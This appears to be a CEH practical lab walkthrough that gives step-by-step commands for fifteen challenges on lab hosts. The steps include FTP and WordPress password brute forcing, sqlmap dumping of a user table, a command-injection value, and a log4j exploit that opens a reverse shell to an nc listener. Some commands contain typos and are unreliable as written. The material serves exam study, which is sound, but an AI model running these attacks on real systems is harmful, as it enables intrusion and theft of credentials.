Challenge 1:
CEHORG suspects of a possible session hijacking attack on a machine in its network. The organisation has retained the network traffic data for the session at C:\Users\Admin\Documents in the EH Workstation – 2 as sniffsession.pcap. You have been assigned a task to perform an analysis and find out the protocol that has been used for sniffing on its network. (Format: AAA)
⦁	open file with wireshark, Go to edit preferences - protocal - ARP/RARP - check Detect arp request stroms and detect duplicate ip and click ok.
⦁	You need to check all protocals for possible sniffing pattern, here filter Arp protocal , our preferences shows whether there is a duplicate use of ip or not


Challenge 2:
Perform an HTTP-recon on www.certifiedhacker.com and find out the version of Nginx used by the web server. (Format: N.NN.N)
⦁	whatweb domain name


Challenge 3:
An FTP site is hosted on a machine in the CEHORG network. Crack the FTP credentials, obtain the “flag.txt” file and determine the content in the file. (Format: Aaaaaaa*AAA)
⦁	use wordlist in desktop/web server hacking/wordlist
⦁	hydra -L Username.txt -P Password.txt ftp://ip
⦁	use credential at ftp 172.16.0.12
⦁	get flag.txt


Challenge 4:
Perform Banner grabbing on the web application movies.cehorg.com and find out the ETag of the respective target machine. (Format: "NaNNNNNaaaNaaNN*N")
⦁	telnet movies.cehorg.com 80
⦁	GET / HTTP/1.0


Challenge 5:
Identify the Content Management System used by www.cehorg.com. (Format: AaaaAaaaa)
⦁	whatweb url


Challenge 6:
Perform web application reconnaissance on movies.cehorg.com and find out the HTTP server used by the web application. (Format: Aaaaaaaaa-AAA/NN.N)
⦁	whatweb (url)


Challenge 7:
Perform Web Crawling on the web application movies.cehorg.com and identify the number of live png files in images folder. (Format: N)
⦁	Use owasp zap automated scan or curl http://movies/cehorg.com/ | grep .png 


Challenge 8:
Identify the load balancing service used by eccouncil.org. (Format: aaaaaaaaaa)
⦁	lbd eccouncil.org


Challenge 9:
Perform a bruteforce attack on www.cehorg.com and find the password of user adam. (Format: aaaaaaNNNN)
⦁	wpscan --url http://www.cehorg.com/wp-login.php -U adam -P password.txt
⦁	use password list in desktop


Challenge 10:
Perform parameter tampering on movies.cehorg.com and find out the user for id 1003. (Format: Aaaaa)
⦁	Type the username as "Jason" and password as "welcome"
⦁	We found this username and password in the engage part 2. While dumping the wireshark capture data. REMEMBER?
⦁	just change id value in url from 1 to 1003 (http://movies.cehorg.com/viewprofile.aspx?id=1003)


Challenge 11:
Perform a SQL Injection attack on movies.cehorg.com and find out the number of users available in the database. Use Jason/welcome as login credentials. (Format: N)
⦁	Copy the cookie value of user session jason in inspect element console, type document.cookie
⦁	sqlmap -u "http://movies.cehorg.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl="; --dbs
⦁	sqlmap -u "http://movies.cehorg.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moveiscope --tables
⦁	sqlmap -u "http://movies.cehorg.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moviescope -T user-Login --dump


Challenge 12:
Perform XSS vulnerability test on www.cehorg.com and identify whether the application is vulnerable to attack or not. (Yes/No). (Format: Aa)
⦁	Run owasp zap automated scan on target
⦁	check alerts tab for vulnerabilities list
Solution 2:
⦁	nmap -p 80 --script vuln <ip> | grep xss


Challenge 13:
A file named Hash.txt has been uploaded through DVWA (http://10.10.10.25:8080/DVWA). The file is located in the directory mentioned below. Access the file and crack the MD5 hash to reveal the original message; enter the content after cracking the hash. You can log into the DVWA using the following credentials. Note: Username- admin; Password- password Path: C:\wamp64\www\DVWA\hackable\uploads\Hash.txt Hint: Use “type” command to view the file. Use the following link to decrypt the hash- https://hashes.com/en/decrypt/hash (Format: Aa*aaNa)
⦁	Set Low option in security settings.
⦁	Goto http://10.10.10.25:8080/DVWA/hackable/uploads/Hash.txt
⦁	Copyand paste the hash in - https://hashes.com/en/decrypt/hash 


Challenge 14:
Perform command injection attack on 10.10.10.25 and find out how many user accounts are registered with the machine. Note: Exclude admin/Guest user (Format: N)
⦁	Set Low option in security settings.
⦁	Type 127.0.0.1 | net user in command injection tab


Challenge 15:
You have identified a vulnerable web application on a Linux server at port 8080. Exploit the web application vulnerability, gain access to the server and enter the content of RootFlag.txt as the answer. (Format: Aa*aaNNNN)
⦁	First find the ip hosting website in port 8080 using nmap.Then do further steps
⦁	In home execute 
⦁	tar -xf jdk-8u202-linux-x64.tar.gz
⦁	mv jdk1.8.0_202 /usr/bin
⦁	cd log4j-shell-poc
⦁	pluma poc.py
⦁	Update the JDK Path in the Poc.py file
⦁	Change Line no: 62, replace jdk1.8.0_20/bin/javac with "/usr/bin/jdk1.8.0_202/bin/javac"
⦁	Change Line no: 87, replace jdk1.8.0_20/bin/java with "/usr/bin/jdk1.8.0_202/bin/java"
⦁	Change Line no: 99, replace jdk1.8.0_20/bin/java with "/usr/bin/jdk1.8.0_202/bin/java"
⦁	execute this in seperate terminal [ nc -lvp 9001]
⦁	python3 poc.py --userip {ip of attacker pc} --webport 8080 --lport 9001
⦁	Copy the [send this : value to be copied] from the output of previous command
⦁	paste in username box and type any pasword in password box, click login
⦁	Reverse shell connected in seperate terminal where nc is listening
⦁	type cat RootFlag.txt to view answer
⦁	(If not connect to reverse shell reload the website and check the path and try again )

